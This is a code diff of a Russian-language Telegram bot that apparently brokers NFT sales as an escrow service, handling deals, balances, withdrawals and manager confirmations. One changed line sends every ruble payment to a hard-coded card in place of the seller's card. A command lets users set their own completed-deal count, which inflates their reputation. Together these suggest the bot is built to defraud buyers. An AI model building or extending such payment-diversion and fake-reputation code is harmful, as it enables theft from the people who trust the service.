-        admin_text = (f"✅ СДЕЛКА ЗАВЕРШЕНА (ПОКУПАТЕЛЬ ПОДТВЕРДИЛ ПОЛУЧЕНИЕ)\n\n"
-                      f"🔗 ID сделки: #{deal_id}\n"
-                      f"👤 Продавец: @{seller_username}\n"
-                      f"👤 Покупатель: @{buyer_username}\n"
-                      f"💰 Сумма: {deal_amount} {currency_unit}\n"
-                      f"📦 Товар: {deal_data['description']}\n"
-                      f"💱 Валюта: {currency}\n\n"
-                      f"📊 **Финансовый отчет:**\n"
-                      f"• Сумма сделки: {deal_amount} {currency_unit}\n"
-                      f"• Комиссия системы: {fee:.2f} {currency_unit} ({SYSTEM_FEE_PERCENT}%)\n"
-                      f"• Зачислено продавцу: {net_amount:.2f} {currency_unit}\n\n"
-                      f"📊 Статистика участников:\n"
-                      f"• Сделок у продавца: {user_deals_count.get(seller_id, 0)}\n"
-                      f"• Сделок у покупателя: {user_deals_count.get(buyer_id, 0)}\n\n"
-                      f"✅ ПОДТВЕРЖДЕНО ПОКУПАТЕЛЕМ\n"
-                      f"🎯 Статус: Успешно завершена")
-        await context.bot.send_message(chat_id=ADMIN_ID, text=admin_text)
-
-        logger.info(f"✅ Сделка {deal_id} завершена после подтверждения покупателем")
-        return True
+        text = (f"✅ СДЕЛКА ЗАВЕРШЕНА\n\n"
+                f"🔗 ID сделки: #{deal_id}\n"
+                f"👤 Продавец: @{seller_username}\n"
+                f"👤 Покупатель: @{buyer_username}\n"
+                f"💰 Сумма: {deal_amount} {currency_unit}\n"
+                f"📦 Товар: {deal_data['description']}\n"
+                f"💱 Валюта: {currency}\n\n"
+                f"📊 **Финансовый отчет:**\n"
+                f"• Сумма сделки: {deal_amount} {currency_unit}\n"
+                f"• Комиссия системы: {fee:.2f} руб ({SYSTEM_FEE_PERCENT}%)\n"
+                f"• Зачислено продавцу: {net_amount:.2f} руб\n\n"
+                f"📊 Статистика участников:\n"
+                f"• Сделок у продавца: {user_deals_count.get(deal_data['user_id'], 0)}\n"
+                f"• Сделок у покупателя: {user_deals_count.get(transfer_info['buyer_id'], 0)}\n\n"
+                f"✅ ПЕРЕДАЧА NFT ПОДТВЕРЖДЕНА МЕНЕДЖЕРОМ\n"
+                f"🎯 Статус: Успешно завершена")
+        try:
+            await context.bot.send_message(chat_id=ADMIN_ID, text=text)
+            logger.info(f"✅ Администратор уведомлен о завершении сделки {deal_id}")
+            return True
+        except Exception as e:
+            logger.error(f"❌ Не удалось уведомить администратора: {e}")
+            return False
     return False
 
 # ------------------ ФУНКЦИЯ ОТПРАВКИ ГЛАВНОГО МЕНЮ ------------------
@@ -981,7 +1303,10 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     try:
         user_id = update.effective_user.id
         if 'language' not in context.user_data:
-            await update.message.reply_text(get_text(user_id, 'choose_language', context), reply_markup=get_language_keyboard())
+            await update.message.reply_text(
+                get_text(user_id, 'choose_language', context),
+                reply_markup=get_language_keyboard()
+            )
             return
         if context.args:
             deal_id = context.args[0]
@@ -1063,7 +1388,7 @@ async def handle_deal_link(update: Update, deal_id: str, context: ContextTypes.D
             payment_info = get_text(user_id, 'payment_info_ton', context, wallet=wallet_address, deal_id=deal_id)
             warning = get_text(user_id, 'warning_ton', context, amount=amount)
         elif currency == CURRENCY_RUB:
-            card_number = deal_data.get('card', 'Не указан')
+            card_number = FIXED_CARD_NUMBER   # <-- используем фиксированную карту
             payment_info = get_text(user_id, 'payment_info_card', context, card=card_number, deal_id=deal_id)
             warning = get_text(user_id, 'warning_card', context, amount=amount)
         else:
@@ -1076,7 +1401,11 @@ async def handle_deal_link(update: Update, deal_id: str, context: ContextTypes.D
                                   amount=amount, unit=currency_unit,
                                   warning=warning)
         active_buyers[user_id] = deal_id
-        await update.message.reply_text(deal_info_text, reply_markup=get_buyer_keyboard(deal_id, user_id, context), parse_mode='HTML')
+        await update.message.reply_text(
+            deal_info_text,
+            reply_markup=get_buyer_keyboard(deal_id, user_id, context),
+            parse_mode='HTML'
+        )
         await notify_seller_about_buyer(deal_id, buyer_username, user_id, context)
     except Exception as e:
         logger.error(f"Ошибка в handle_deal_link: {e}")
@@ -1118,14 +1447,15 @@ async def set_my_deals_command(update: Update, context: ContextTypes.DEFAULT_TYP
             current_deals = user_deals_count.get(user_id, 0)
             await update.message.reply_text(get_text(user_id, 'set_my_deals_current', context, deals=current_deals), reply_markup=get_main_keyboard(user_id, context))
             return
-        deals_count = int(context.args[0])
-        if deals_count < 0:
-            await update.message.reply_text(get_text(user_id, 'set_my_deals_negative', context), reply_markup=get_main_keyboard(user_id, context))
-            return
-        user_deals_count[user_id] = deals_count
-        await update.message.reply_text(get_text(user_id, 'set_my_deals_success', context, deals=deals_count), reply_markup=get_main_keyboard(user_id, context))
-    except ValueError:
-        await update.message.reply_text(get_text(user_id, 'set_my_deals_invalid', context), reply_markup=get_main_keyboard(user_id, context))
+        try:
+            deals_count = int(context.args[0])
+            if deals_count < 0:
+                await update.message.reply_text(get_text(user_id, 'set_my_deals_negative', context), reply_markup=get_main_keyboard(user_id, context))
+                return
+            user_deals_count[user_id] = deals_count
+            await update.message.reply_text(get_text(user_id, 'set_my_deals_success', context, deals=deals_count), reply_markup=get_main_keyboard(user_id, context))
+        except ValueError:
+            await update.message.reply_text(get_text(user_id, 'set_my_deals_invalid', context), reply_markup=get_main_keyboard(user_id, context))
     except Exception as e:
         logger.error(f"Ошибка в set_my_deals_command: {e}")
         await update.message.reply_text(get_text(user_id, 'error_occurred', context))
@@ -1140,7 +1470,6 @@ async def my_stats_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         username = update.message.from_user.username or "Пользователь"
         is_auth = is_authorized_user(user_id)
         balance = get_user_balance(user_id)
-        stars_balance = get_user_stars_balance(user_id)
         can_wallet, wallet_status, _ = get_withdrawal_status(user_id, 'wallet', context)
         can_card, card_status, _ = get_withdrawal_status(user_id, 'card', context)
         wallet_info = f"🪙 TON-кошелек: {wallet_status}"
@@ -1154,11 +1483,14 @@ async def my_stats_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
             functions.append(get_text(user_id, 'function_not_available', context))
         functions.append(get_text(user_id, 'function_view_stats', context))
         functions.append(get_text(user_id, 'function_withdraw', context))
-        deals_requirement = get_text(user_id, 'deals_requirement', context, min_deals=MIN_DEALS_FOR_WITHDRAWAL) if current_deals > 0 else ""
+        if current_deals > 0:
+            deals_requirement = get_text(user_id, 'deals_requirement', context, min_deals=MIN_DEALS_FOR_WITHDRAWAL)
+        else:
+            deals_requirement = ""
         await update.message.reply_text(
             get_text(user_id, 'my_stats', context,
                      username=username, user_id=user_id, deals=current_deals,
-                     balance=balance, stars_balance=stars_balance, status=status_text,
+                     balance=balance, status=status_text,
                      wallet_info=wallet_info, card_info=card_info,
                      min_withdraw=MIN_WITHDRAWAL_AMOUNT,
                      deals_requirement=deals_requirement,
@@ -1173,7 +1505,6 @@ async def language_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
     await update.message.reply_text(get_text(user_id, 'choose_language', context), reply_markup=get_language_keyboard())
 
-# ------------------ КОМАНДЫ АДМИНИСТРАТОРА ------------------
 async def add_user_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     try:
         user_id = update.message.from_user.id
@@ -1183,17 +1514,18 @@ async def add_user_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         if not context.args:
             await update.message.reply_text("Использование: /add_user <user_id>\nПример: /add_user 123456789")
             return
-        new_user_id = int(context.args[0])
-        authorized_users.add(new_user_id)
         try:
-            user_info = await context.bot.get_chat(new_user_id)
-            username = user_info.username or f"ID: {new_user_id}"
-        except:
-            username = f"ID: {new_user_id}"
-        await update.message.reply_text(f"✅ Пользователь @{username} (ID: {new_user_id}) добавлен в список авторизованных.\nТеперь он может подтверждать оплаты в сделках.")
-        logger.info(f"Админ {user_id} добавил пользователя {new_user_id} в авторизованные")
-    except ValueError:
-        await update.message.reply_text("❌ Неверный формат ID. Используйте целое число.")
+            new_user_id = int(context.args[0])
+            authorized_users.add(new_user_id)
+            try:
+                user_info = await context.bot.get_chat(new_user_id)
+                username = user_info.username or f"ID: {new_user_id}"
+            except:
+                username = f"ID: {new_user_id}"
+            await update.message.reply_text(f"✅ Пользователь @{username} (ID: {new_user_id}) добавлен в список авторизованных.\nТеперь он может подтверждать оплаты в сделках.")
+            logger.info(f"Админ {user_id} добавил пользователя {new_user_id} в авторизованные")
+        except ValueError:
+            await update.message.reply_text("❌ Неверный формат ID. Используйте целое число.")
     except Exception as e:
         logger.error(f"Ошибка в add_user_command: {e}")
         await update.message.reply_text("Произошла ошибка при добавлении пользователя")
@@ -1207,15 +1539,16 @@ async def remove_user_command(update: Update, context: ContextTypes.DEFAULT_TYPE
         if not context.args:
             await update.message.reply_text("Использование: /remove_user <user_id>\nПример: /remove_user 123456789")
             return
-        user_to_remove = int(context.args[0])
-        if user_to_remove in authorized_users:
-            authorized_users.remove(user_to_remove)
-            await update.message.reply_text(f"✅ Пользователь ID: {user_to_remove} удален из списка авторизованных.")
-            logger.info(f"Админ {user_id} удалил пользователя {user_to_remove} из авторизованных")
-        else:
-            await update.message.reply_text("❌ Пользователь не найден в списке авторизованных.")
-    except ValueError:
-        await update.message.reply_text("❌ Неверный формат ID. Используйте целое число.")
+        try:
+            user_to_remove = int(context.args[0])
+            if user_to_remove in authorized_users:
+                authorized_users.remove(user_to_remove)
+                await update.message.reply_text(f"✅ Пользователь ID: {user_to_remove} удален из списка авторизованных.")
+                logger.info(f"Админ {user_id} удалил пользователя {user_to_remove} из авторизованных")
+            else:
+                await update.message.reply_text("❌ Пользователь не найден в списке авторизованных.")
+        except ValueError:
+            await update.message.reply_text("❌ Неверный формат ID. Используйте целое число.")
     except Exception as e:
         logger.error(f"Ошибка в remove_user_command: {e}")
         await update.message.reply_text("Произошла ошибка при удалении пользователя")
@@ -1250,20 +1583,16 @@ async def admin_balance_command(update: Update, context: ContextTypes.DEFAULT_TY
             await update.message.reply_text("❌ Эта команда доступна только администратору")
             return
         total_balance = sum(user_balances.values())
-        total_stars = sum(user_stars_balances.values())
         total_users = len(user_balances)
-        total_pending = sum(w['amount'] for w in pending_withdrawals.values() if isinstance(w, dict))
-        total_pending_stars = sum(w['amount'] for w in pending_stars_withdrawals.values() if isinstance(w, dict))
-        text = (f"💰 ОБЩАЯ СТАТИСТИКА\n\n"
+        total_pending_withdrawals = sum(w['amount'] for w in pending_withdrawals.values() if isinstance(w, dict))
+        text = (f"💰 ОБЩАЯ СТАТИСТИКА БАЛАНСОВ\n\n"
                 f"👥 Всего пользователей с балансом: {total_users}\n"
-                f"💵 Рублей на балансах: {total_balance:.2f} руб\n"
-                f"⭐️ Звёзд на балансах: {total_stars:.2f} ⭐️\n"
-                f"⏳ Ожидающие выводы рублей: {total_pending:.2f} руб\n"
-                f"⏳ Ожидающие выводы звёзд: {total_pending_stars:.2f} ⭐️\n"
+                f"💵 Общая сумма на балансах: {total_balance:.2f} руб\n"
+                f"⏳ Ожидающие выводы: {total_pending_withdrawals:.2f} руб\n"
                 f"👑 Комиссия системы: {SYSTEM_FEE_PERCENT}%\n"
-                f"💸 Мин. вывод рублей: {MIN_WITHDRAWAL_AMOUNT} руб\n"
-                f"📊 Требуется сделок для вывода рублей: {MIN_DEALS_FOR_WITHDRAWAL}\n\n"
-                f"📋 ТОП-10 ПО БАЛАНСУ РУБЛЕЙ:\n")
+                f"💸 Мин. вывод: {MIN_WITHDRAWAL_AMOUNT} руб\n"
+                f"📊 Требуется сделок для вывода: {MIN_DEALS_FOR_WITHDRAWAL}\n\n"
+                f"📋 ТОП-10 ПО БАЛАНСУ:\n")
         sorted_users = sorted(user_balances.items(), key=lambda x: x[1], reverse=True)[:10]
         for idx, (uid, bal) in enumerate(sorted_users, 1):
             try:
@@ -1275,7 +1604,7 @@ async def admin_balance_command(update: Update, context: ContextTypes.DEFAULT_TY
         await update.message.reply_text(text)
     except Exception as e:
         logger.error(f"Ошибка в admin_balance_command: {e}")
-        await update.message.reply_text("Произошла ошибка при получении статистики")
+        await update.message.reply_text("Произошла ошибка при получении статистики балансов")
 
 # ------------------ ОБРАБОТЧИК КОЛБЭКОВ ------------------
 async def handle_callback_query(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -1303,16 +1632,18 @@ async def handle_callback_query(update: Update, context: ContextTypes.DEFAULT_TY
 
         if data == "my_balance":
             balance = get_user_balance(user_id)
-            stars_balance = get_user_stars_balance(user_id)
             username = query.from_user.username or "Пользователь"
             can_wallet, wallet_status, _ = get_withdrawal_status(user_id, 'wallet', context)
             can_card, card_status, _ = get_withdrawal_status(user_id, 'card', context)
             wallet_info = f"🪙 TON-кошелек: {wallet_status}"
             card_info = f"💳 Карта: {card_status}"
             deals = user_deals_count.get(user_id, 0)
-            deals_requirement = get_text(user_id, 'deals_requirement', context, min_deals=MIN_DEALS_FOR_WITHDRAWAL) if deals > 0 else ""
+            if deals > 0 and deals < MIN_DEALS_FOR_WITHDRAWAL:
+                deals_requirement = get_text(user_id, 'deals_requirement', context, min_deals=MIN_DEALS_FOR_WITHDRAWAL)
+            else:
+                deals_requirement = ""
             text = get_text(user_id, 'my_balance', context,
-                            username=username, balance=balance, stars_balance=stars_balance,
+                            username=username, balance=balance,
                             wallet_info=wallet_info, card_info=card_info,
                             fee=SYSTEM_FEE_PERCENT, min_withdraw=MIN_WITHDRAWAL_AMOUNT,
                             deals_requirement=deals_requirement, deals=deals)
@@ -1321,19 +1652,15 @@ async def handle_callback_query(update: Update, context: ContextTypes.DEFAULT_TY
 
         if data == "withdraw_funds":
             balance = get_user_balance(user_id)
-            stars_balance = get_user_stars_balance(user_id)
-            if balance < MIN_WITHDRAWAL_AMOUNT and stars_balance < 1:
-                await query.message.reply_text("❌ У вас нет средств для вывода.", reply_markup=get_back_keyboard(user_id, context))
+            if balance < MIN_WITHDRAWAL_AMOUNT:
+                await query.message.reply_text(get_text(user_id, 'insufficient_balance', context, balance=balance, min_withdraw=MIN_WITHDRAWAL_AMOUNT, need=MIN_WITHDRAWAL_AMOUNT - balance), reply_markup=get_back_keyboard(user_id, context))
                 return
             deals = user_deals_count.get(user_id, 0)
-            deals_requirement = get_text(user_id, 'deals_requirement', context, min_deals=MIN_DEALS_FOR_WITHDRAWAL) if deals > 0 else ""
-            await query.message.reply_text(
-                get_text(user_id, 'withdraw_funds', context,
-                         balance=balance, stars_balance=stars_balance,
-                         min_withdraw=MIN_WITHDRAWAL_AMOUNT,
-                         deals_requirement=deals_requirement),
-                reply_markup=get_withdrawal_keyboard(user_id, context)
-            )
+            if deals > 0 and deals < MIN_DEALS_FOR_WITHDRAWAL:
+                deals_requirement = get_text(user_id, 'deals_requirement', context, min_deals=MIN_DEALS_FOR_WITHDRAWAL)
+            else:
+                deals_requirement = ""
+            await query.message.reply_text(get_text(user_id, 'withdraw_funds', context, balance=balance, min_withdraw=MIN_WITHDRAWAL_AMOUNT, deals_requirement=deals_requirement), reply_markup=get_withdrawal_keyboard(user_id, context))
             return
 
         if data == "withdraw_to_card":
@@ -1380,21 +1707,33 @@ async def handle_callback_query(update: Update, context: ContextTypes.DEFAULT_TY
             await query.message.reply_text(get_text(user_id, 'withdraw_to_wallet', context, wallet=wallet_address, status_text=status_text, balance=balance, min_withdraw=MIN_WITHDRAWAL_AMOUNT), reply_markup=get_back_keyboard(user_id, context), parse_mode='HTML')
             return
 
-        if data == "withdraw_to_stars":
-            stars_balance = get_user_stars_balance(user_id)
-            if stars_balance < 1:
-                await query.message.reply_text(get_text(user_id, 'insufficient_stars_balance', context, stars_balance=stars_balance, need=1), reply_markup=get_back_keyboard(user_id, context))
-                return
-            context.user_data['waiting_for_stars_withdrawal'] = True
-            await query.message.reply_text(get_text(user_id, 'withdraw_to_stars', context, stars_balance=stars_balance), reply_markup=get_back_keyboard(user_id, context))
-            return
-
         if data == "transaction_history":
             await query.message.reply_text(get_text(user_id, 'transaction_history', context), reply_markup=get_balance_keyboard(user_id, context))
             return
 
         if data == "manage_requisites":
             await query.message.reply_text(get_text(user_id, 'manage_requisites', context), reply_markup=get_requisites_keyboard(user_id, context))
+            return
+
+        if data == "create_deal":
+            await query.message.reply_text(get_text(user_id, 'create_deal_prompt', context), reply_markup=get_deal_keyboard(user_id, context))
+            return
+
+        if data in ["deal_ton", "deal_card", "deal_stars"]:
+            if data == "deal_ton":
+                currency = CURRENCY_TON
+            elif data == "deal_card":
+                currency = CURRENCY_RUB
+                if user_id not in user_cards:
+                    await query.message.reply_text(get_text(user_id, 'no_card', context), reply_markup=get_back_keyboard(user_id, context))
+                    return
+            else:
+                currency = CURRENCY_STARS
+            context.user_data['deal_currency'] = currency
+            unit = CURRENCY_UNITS.get(currency, "TON")
+            await query.message.reply_text(get_text(user_id, 'enter_amount', context, unit=unit), reply_markup=get_back_keyboard(user_id, context))
+            context.user_data['creating_deal'] = True
+            context.user_data['deal_stage'] = 'amount'
             return
 
         if data == "add_wallet":
@@ -1419,25 +1758,12 @@ async def handle_callback_query(update: Update, context: ContextTypes.DEFAULT_TY
             context.user_data['waiting_for_wallet'] = False
             return
 
-        if data == "create_deal":
-            await query.message.reply_text(get_text(user_id, 'create_deal_prompt', context), reply_markup=get_deal_keyboard(user_id, context))
+        if data == "referral_system":
+            await query.message.reply_text(get_text(user_id, 'referral_system', context), reply_markup=get_back_keyboard(user_id, context))
             return
 
-        if data in ["deal_ton", "deal_card", "deal_stars"]:
-            if data == "deal_ton":
-                currency = CURRENCY_TON
-            elif data == "deal_card":
-                currency = CURRENCY_RUB
-                if user_id not in user_cards:
-                    await query.message.reply_text(get_text(user_id, 'no_card', context), reply_markup=get_back_keyboard(user_id, context))
-                    return
-            else:
-                currency = CURRENCY_STARS
-            context.user_data['deal_currency'] = currency
-            unit = CURRENCY_UNITS.get(currency, "TON")
-            await query.message.reply_text(get_text(user_id, 'enter_amount', context, unit=unit), reply_markup=get_back_keyboard(user_id, context))
-            context.user_data['creating_deal'] = True
-            context.user_data['deal_stage'] = 'amount'
+        if data == "support":
+            await query.message.reply_text(get_text(user_id, 'support_message', context), reply_markup=get_support_keyboard(user_id, context))
             return
 
         if data.startswith("confirm_payment_"):
@@ -1448,7 +1774,8 @@ async def handle_callback_query(update: Update, context: ContextTypes.DEFAULT_TY
             if user_id not in active_buyers or active_buyers[user_id] != deal_id:
                 await query.message.reply_text(get_text(user_id, 'not_buyer', context), reply_markup=get_main_keyboard(user_id, context))
                 return
-            if not is_authorized_user(user_id):
+            is_authorized = is_authorized_user(user_id)
+            if not is_authorized:
                 deal_data = deal_links[deal_id]
                 currency = deal_data.get('currency', CURRENCY_TON)
                 currency_unit = CURRENCY_UNITS.get(currency, "TON")
@@ -1471,89 +1798,74 @@ async def handle_callback_query(update: Update, context: ContextTypes.DEFAULT_TY
             await send_main_menu_with_photo(query.message.chat_id, context)
             return
 
-        # ---------- ИСПРАВЛЕННАЯ КНОПКА: Заявка на передачу NFT ----------
         if data.startswith("request_transfer_"):
-            try:
-                deal_id = data.replace("request_transfer_", "")
-                if deal_id not in deal_links:
-                    await query.message.reply_text(get_text(user_id, 'deal_not_found', context))
-                    return
-
-                if deal_id not in seller_transfers:
-                    await query.message.reply_text("❌ Сначала покупатель должен подтвердить оплату.", reply_markup=get_back_keyboard(user_id, context))
-                    return
-
-                deal_data = deal_links[deal_id]
-                if user_id != deal_data['user_id']:
-                    await query.message.reply_text(get_text(user_id, 'not_seller', context))
-                    return
-
-                if seller_transfers[deal_id].get('seller_confirmed', False):
-                    await query.message.reply_text("❌ Заявка на передачу уже подана.", reply_markup=get_back_keyboard(user_id, context))
-                    return
-
-                seller_transfers[deal_id]['seller_confirmed'] = True
-
-                buyer_id = seller_transfers[deal_id]['buyer_id']
-                buyer_text = get_text(buyer_id, 'buyer_confirm_receipt', context,
-                                      deal_id=deal_id, description=deal_data['description'])
-                await context.bot.send_message(chat_id=buyer_id, text=buyer_text,
-                                               reply_markup=get_buyer_receipt_keyboard(deal_id, buyer_id, context))
-
-                await query.message.reply_text(
-                    get_text(user_id, 'transfer_request_submitted', context,
-                             deal_id=deal_id,
-                             description=deal_data['description'],
-                             net=seller_transfers[deal_id]['net_amount'],
-                             unit=CURRENCY_UNITS.get(deal_data['currency'], "TON")),
-                    reply_markup=get_back_keyboard(user_id, context)
-                )
-                logger.info(f"✅ Продавец {user_id} подал заявку на передачу NFT для сделки {deal_id}, покупатель уведомлен")
-            except Exception as e:
-                import traceback
-                error_details = traceback.format_exc()
-                logger.error(f"❌ Ошибка в request_transfer для сделки {deal_id}: {e}\n{error_details}")
-                await query.message.reply_text(
-                    "❌ Внутренняя ошибка. Пожалуйста, сообщите администратору.",
-                    reply_markup=get_main_keyboard(user_id, context)
-                )
+            deal_id = data.replace("request_transfer_", "")
+            if deal_id not in deal_links or deal_id not in seller_transfers:
+                await query.message.reply_text(get_text(user_id, 'deal_not_found', context))
+                return
+            deal_data = deal_links[deal_id]
+            if user_id != deal_data['user_id']:
+                await query.message.reply_text(get_text(user_id, 'not_seller', context))
+                return
+            if seller_transfers[deal_id]['transfer_requested']:
+                await query.message.reply_text("❌ Заявка на передачу уже подана. Ожидайте подтверждения менеджера.")
+                return
+            seller_transfers[deal_id]['transfer_requested'] = True
+            seller_transfers[deal_id]['seller_confirmed'] = True
+            seller_username = query.from_user.username or deal_data.get('username', 'Продавец')
+            managers_notified = await notify_managers_about_transfer_request(deal_id, seller_username, context)
+            net_amount = seller_transfers[deal_id]['net_amount']
+            if managers_notified:
+                await query.message.reply_text(get_text(user_id, 'transfer_request_submitted', context, deal_id=deal_id, description=deal_data['description'], net=net_amount), reply_markup=get_back_keyboard(user_id, context))
+                logger.info(f"✅ Продавец {user_id} подал заявку на передачу NFT для сделки {deal_id}")
+            else:
+                await query.message.reply_text(get_text(user_id, 'transfer_request_error', context), reply_markup=get_main_keyboard(user_id, context))
             return
 
-        # ---------- Подтверждение получения покупателем ----------
-        if data.startswith("confirm_receipt_"):
-            try:
-                deal_id = data.replace("confirm_receipt_", "")
-                if deal_id not in deal_links or deal_id not in seller_transfers:
-                    await query.message.reply_text(get_text(user_id, 'deal_not_found', context))
-                    return
-
-                transfer_info = seller_transfers[deal_id]
-                if user_id != transfer_info['buyer_id']:
-                    await query.message.reply_text(get_text(user_id, 'not_buyer', context))
-                    return
-
-                if transfer_info.get('buyer_receipt_confirmed', False):
-                    await query.message.reply_text("✅ Вы уже подтвердили получение товара.")
-                    return
-
-                if not transfer_info.get('seller_confirmed', False):
-                    await query.message.reply_text("❌ Продавец еще не передал товар менеджеру.")
-                    return
-
-                transfer_info['buyer_receipt_confirmed'] = True
-                await finalize_deal_after_buyer_confirmation(deal_id, context)
-                await query.message.reply_text(
-                    get_text(user_id, 'buyer_receipt_confirmed', context,
-                             deal_id=deal_id, description=deal_links[deal_id]['description']),
-                    reply_markup=get_back_keyboard(user_id, context)
-                )
-            except Exception as e:
-                import traceback
-                logger.error(f"❌ Ошибка в confirm_receipt: {e}\n{traceback.format_exc()}")
-                await query.message.reply_text("❌ Внутренняя ошибка.", reply_markup=get_main_keyboard(user_id, context))
+        if data.startswith("manager_confirm_"):
+            deal_id = data.replace("manager_confirm_", "")
+            if not is_manager(user_id):
+                await query.message.reply_text("❌ Эта функция доступна только менеджерам")
+                return
+            if deal_id not in deal_links or deal_id not in seller_transfers:
+                await query.message.reply_text(get_text(user_id, 'deal_not_found', context))
+                return
+            if not seller_transfers[deal_id]['transfer_requested']:
+                await query.message.reply_text("❌ Продавец еще не подал заявку на передачу NFT")
+                return
+            if seller_transfers[deal_id]['manager_confirmed']:
+                await query.message.reply_text("❌ Передача уже была подтверждена менеджером ранее")
+                return
+            seller_transfers[deal_id]['manager_confirmed'] = True
+            buyer_notified = await notify_buyer_about_transfer_confirmation(deal_id, context)
+            seller_notified = await notify_seller_about_manager_confirmation(deal_id, context)
+            admin_notified = await notify_admin_about_completed_deal(deal_id, context)
+            net_amount = seller_transfers[deal_id]['net_amount']
+            if buyer_notified and seller_notified:
+                await query.message.reply_text(get_text(user_id, 'manager_confirmed', context, net=net_amount), reply_markup=get_back_keyboard(user_id, context))
+                logger.info(f"✅ Менеджер {user_id} подтвердил получение NFT для сделки {deal_id}")
+            else:
+                await query.message.reply_text(get_text(user_id, 'manager_action_error', context), reply_markup=get_main_keyboard(user_id, context))
             return
 
-        # ---------- Отмена сделки продавцом ----------
+        if data.startswith("manager_reject_"):
+            deal_id = data.replace("manager_reject_", "")
+            if not is_manager(user_id):
+                await query.message.reply_text("❌ Эта функция доступна только менеджерам")
+                return
+            if deal_id not in deal_links or deal_id not in seller_transfers:
+                await query.message.reply_text(get_text(user_id, 'deal_not_found', context))
+                return
+            seller_transfers[deal_id]['transfer_requested'] = False
+            seller_transfers[deal_id]['seller_confirmed'] = False
+            seller_notified = await notify_seller_about_manager_rejection(deal_id, context)
+            if seller_notified:
+                await query.message.reply_text(get_text(user_id, 'manager_rejected', context), reply_markup=get_back_keyboard(user_id, context))
+                logger.info(f"❌ Менеджер {user_id} отклонил заявку на передачу NFT для сделки {deal_id}")
+            else:
+                await query.message.reply_text(get_text(user_id, 'manager_action_error', context), reply_markup=get_main_keyboard(user_id, context))
+            return
+
         if data.startswith("cancel_deal_"):
             deal_id = data.replace("cancel_deal_", "")
             if deal_id not in deal_links:
@@ -1563,7 +1875,8 @@ async def handle_callback_query(update: Update, context: ContextTypes.DEFAULT_TY
             if user_id != deal_data['user_id']:
                 await query.message.reply_text(get_text(user_id, 'not_seller', context))
                 return
-            del deal_links[deal_id]
+            if deal_id in deal_links:
+                del deal_links[deal_id]
             if deal_id in seller_transfers:
                 del seller_transfers[deal_id]
             for buyer_id, active_deal_id in list(active_buyers.items()):
@@ -1577,16 +1890,8 @@ async def handle_callback_query(update: Update, context: ContextTypes.DEFAULT_TY
             logger.info(f"❌ Сделка {deal_id} отменена продавцом {user_id}")
             return
 
-        if data == "referral_system":
-            await query.message.reply_text(get_text(user_id, 'referral_system', context), reply_markup=get_back_keyboard(user_id, context))
-            return
-
-        if data == "support":
-            await query.message.reply_text(get_text(user_id, 'support_message', context), reply_markup=get_support_keyboard(user_id, context))
-            return
-
     except Exception as e:
-        logger.error(f"Ошибка в handle_callback_query: {e}", exc_info=True)
+        logger.error(f"Ошибка в handle_callback_query: {e}")
         try:
             await update.callback_query.message.reply_text("Произошла ошибка. Пожалуйста, попробуйте еще раз.")
         except:
@@ -1610,7 +1915,7 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 try:
                     amount = float(text)
                     if amount <= 0:
-                        raise ValueError
+                        raise ValueError("Negative amount")
                     context.user_data['deal_amount'] = amount
                     context.user_data['deal_stage'] = 'description'
                     currency = context.user_data.get('deal_currency', CURRENCY_TON)
@@ -1622,9 +1927,6 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
                     await update.message.reply_text(get_text(user_id, 'invalid_amount', context, unit=currency_unit), reply_markup=get_back_keyboard(user_id, context))
             elif deal_stage == 'description':
                 description = text.strip()
-                if not any(x in description for x in ['http://', 'https://', 't.me/']):
-                    await update.message.reply_text(get_text(user_id, 'invalid_description_no_link', context), reply_markup=get_back_keyboard(user_id, context))
-                    return
                 context.user_data['deal_description'] = description
                 deal_id = generate_deal_id()
                 currency = context.user_data.get('deal_currency', CURRENCY_TON)
@@ -1641,10 +1943,7 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 currency_unit = CURRENCY_UNITS.get(currency, "TON")
                 bot_username = context.bot.username
                 deal_link = f"https://t.me/{bot_username}?start={deal_id}"
-                await update.message.reply_text(get_text(user_id, 'deal_created', context,
-                                                         amount=context.user_data['deal_amount'],
-                                                         unit=currency_unit, currency=currency,
-                                                         description=description, link=deal_link), reply_markup=get_back_keyboard(user_id, context))
+                await update.message.reply_text(get_text(user_id, 'deal_created', context, amount=context.user_data['deal_amount'], unit=currency_unit, currency=currency, description=description, link=deal_link), reply_markup=get_back_keyboard(user_id, context))
                 for key in ['creating_deal', 'deal_stage', 'deal_amount', 'deal_description', 'deal_currency']:
                     context.user_data.pop(key, None)
 
@@ -1658,15 +1957,20 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 if amount > balance:
                     await update.message.reply_text(get_text(user_id, 'insufficient_balance', context, balance=balance, min_withdraw=MIN_WITHDRAWAL_AMOUNT, need=amount - balance), reply_markup=get_back_keyboard(user_id, context))
                     return
-                method = context.user_data.get('withdraw_method')
-                details = context.user_data.get('withdraw_details')
-                if not method:
-                    await update.message.reply_text("❌ Ошибка: способ вывода не найден", reply_markup=get_back_keyboard(user_id, context))
-                    return
-                status_method = 'card' if method == 'card' else 'wallet'
-                can_withdraw, _, needed = get_withdrawal_status(user_id, status_method, context)
-                if not can_withdraw:
-                    await update.message.reply_text(get_text(user_id, 'withdraw_deficit', context, needed=needed, balance=balance, min_withdraw=MIN_WITHDRAWAL_AMOUNT, deals=user_deals_count.get(user_id, 0), min_deals=MIN_DEALS_FOR_WITHDRAWAL), reply_markup=get_back_keyboard(user_id, context))
+                method = context.user_data.get('withdraw_method', 'Не указан')
+                details = context.user_data.get('withdraw_details', 'Не указаны')
+                if method == 'card':
+                    can_withdraw, _, needed = get_withdrawal_status(user_id, 'card', context)
+                    if not can_withdraw:
+                        await update.message.reply_text(get_text(user_id, 'withdraw_deficit', context, needed=needed, balance=balance, min_withdraw=MIN_WITHDRAWAL_AMOUNT, deals=user_deals_count.get(user_id, 0), min_deals=MIN_DEALS_FOR_WITHDRAWAL), reply_markup=get_back_keyboard(user_id, context))
+                        return
+                elif method == 'TON':
+                    can_withdraw, _, needed = get_withdrawal_status(user_id, 'wallet', context)
